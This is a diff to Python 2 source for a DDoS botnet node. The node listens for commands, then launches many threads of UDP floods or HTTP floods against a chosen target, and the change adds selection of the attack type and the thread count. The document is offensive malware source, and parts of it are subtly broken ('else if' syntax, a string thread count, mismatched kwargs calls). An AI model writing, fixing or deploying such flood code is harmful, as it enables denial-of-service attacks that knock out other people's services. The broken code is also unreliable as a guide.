@@ -6,24 +6,26 @@ import urllib2
 import random
 import os
 
-N = 100
-
 class zombie(SocketServer.BaseRequestHandler):
     def handle(self):
         self.data = self.request.recv(1024).strip()
-        timeout, target, port = self.data.split(" ")
+        attack, target, timeout, port, threads = self.data.split(" ")
+        kwargs = {'attack':attack, 'target':target, 'timeout':timeout, 'port':port}
         self.request.sendall("ACK")
-
-        for i in xrange(N):
-            attack = attackHTTPFlood(timeout, target)
-            attack.start()
+        if attack == "udp":
+            fun = attackUDPFlood
+        else if attack == "http":
+            fun = attackHTTPFlood
+        for i in xrange(threads):
+            attacker = fun(kwargs)
+            attacker.start()
 
 class attackUDPFlood(threading.Thread):
-    def __init__(self, timeout, target, port):
+    def __init__(self, **kwargs):
         threading.Thread.__init__(self)
-        self.timeout = int(timeout)
-        self.target = target
-        self.port = int(port)
+        self.timeout = int(kwargs['timeout'])
+        self.target = kwargs['target']
+        self.port = int(kwargs['port'])
 
     def run(self):
         victim = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -34,10 +36,10 @@ class attackUDPFlood(threading.Thread):
             victim.sendto(MESSAGE, (self.target, self.port))
 
 class attackHTTPFlood(threading.Thread):
-    def __init__(self, timeout, target):
+    def __init__(self, **kwargs):
         threading.Thread.__init__(self)
-        self.timeoutAttack = timeout
-        self.target = "http://" + target
+        self.timeoutAttack = kwargs['timeout']
+        self.target = kwargs['target']
 
     def run(self):
         start = time.time()
